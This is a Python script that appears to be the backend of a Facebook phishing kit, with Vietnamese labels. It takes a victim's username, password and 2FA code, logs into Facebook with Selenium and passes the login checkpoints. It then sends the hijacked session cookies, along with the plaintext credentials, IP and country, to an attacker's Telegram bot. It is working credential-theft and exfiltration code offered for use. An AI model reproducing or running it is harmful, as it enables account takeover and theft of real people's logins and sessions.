import json
import os
from datetime import datetime

import requests
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


def read_api_token_and_chat_id_from_json(file_path):
    with open(file_path, "r") as file:
        data = json.load(file)
        api_token = data.get("api_token")
        chat_id = data.get("chat_id")
    return api_token, chat_id


def write_api_token_and_chat_id_to_json(api_token, chat_id):
    data = {"api_token": api_token, "chat_id": chat_id}
    file_path = "config.json"
    with open(file_path, "w") as file:
        json.dump(data, file)


def save_cookies_to_file(username, cookies):
    current_time = datetime.now().strftime("%H-%M")
    filename = f"{username}_{current_time}.json"
    with open(filename, "w") as file:
        json.dump(cookies, file)
    return filename


def send_file_to_telegram(api_token, chat_id, file_path, message):
    url = f"https://api.telegram.org/bot{api_token}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id, 'caption': message, 'parse_mode': 'HTML'}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("File sent successfully!")
        os.remove(file_path)
    else:
        print("Failed to send file.")


def check_status_facebook(username, password, code, ip, country):
    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-features=SameSiteByDefaultCookies')
    driver = webdriver.Chrome(options=options)
    driver.get('https://mbasic.facebook.com/')
    driver.find_element(By.ID, 'm_login_email').send_keys(username)
    driver.find_element(By.NAME, 'pass').send_keys(password)
    driver.find_element(By.NAME, 'login').click()
    try:
        wrong_password_element = driver.find_element(By.ID, 'login_error')
        if wrong_password_element:
            return 'WRONG'
    except:
        pass
    if 'checkpoint' in driver.current_url:
        try:
            approvals_code = driver.find_element(By.NAME, 'approvals_code')
            if code:
                approvals_code.send_keys(code)
                driver.find_element(
                    By.NAME, 'submit[Submit Code]').click()
                try:
                    wrong_code = driver.find_element(
                        By.NAME, 'approvals_code')
                    if wrong_code:
                        return 'WRONG'
                except:
                    pass
                for i in range(8):
                    if i == 7:
                        return 'CP'
                    current_url = driver.current_url
                    if 'checkpoint' in current_url:
                        try:
                            button = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located(
                                    (By.ID, "checkpointSubmitButton-actual-button"))
                            )
                            button.click()
                        except:
                            break
                    else:
                        break
                cookies = driver.get_cookies()
                for cookie in cookies:
                    if 'sameSite' in cookie:
                        del cookie['sameSite']
                api_token, chat_id = read_api_token_and_chat_id_from_json(
                    'config.json')
                filename = save_cookies_to_file(username, cookies)
                status = '2FA'
                caption = "<b>" + status + "</b>\n\n<b>IP:</b> <code>" + ip + "</code>\n<b>Quốc gia:</b> <code>" + country + "</code>\n<b>Tên đăng nhập:</b> <code>" + \
                    username + "</code>\n<b>Mật khẩu:</b> <code>" + password + \
                    "</code>"
                send_file_to_telegram(
                    api_token, chat_id, filename, caption)
                return 'CP'
            else:
                if approvals_code:
                    return '2FA'
        except:
            return 'CP'
    else:
        try:
            driver.get('https://mbasic.facebook.com/')
            email = driver.find_element(By.ID, 'm_login_email')
            if email:
                return 'WRONG'
        except:
            cookies = driver.get_cookies()
            for cookie in cookies:
                if 'sameSite' in cookie:
                    del cookie['sameSite']
            filename = save_cookies_to_file(username, cookies)
            api_token, chat_id = read_api_token_and_chat_id_from_json(
                'config.json')
            status = 'Khong bat 2FA'
            caption = "<b>" + status + "</b>\n\n<b>IP:</b> <code>" + ip + "</code>\n<b>Quốc gia:</b> <code>" + country + "</code>\n<b>Tên đăng nhập:</b> <code>" + \
                username + "</code>\n<b>Mật khẩu:</b> <code>" + password + \
                "</code>"
            send_file_to_telegram(
                api_token, chat_id, filename, caption)
            return 'CP'